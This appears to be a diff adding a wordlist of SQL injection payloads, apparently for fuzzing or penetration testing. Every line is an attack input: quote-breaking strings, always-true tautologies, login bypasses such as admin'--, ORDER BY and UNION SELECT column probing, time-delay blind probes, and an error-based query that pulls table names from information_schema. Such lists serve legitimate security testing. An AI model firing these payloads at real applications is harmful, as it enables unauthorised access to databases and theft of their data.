@@ -1,0 +1,25 @@
+'
+''
+`
+`)
+'))
+'--
+'/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' UNION SELECT null--
+1' UNION SELECT null,null--
+1' UNION SELECT null,null,null--
+' AND SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+admin'--
+admin' #
+' OR 'x'='x
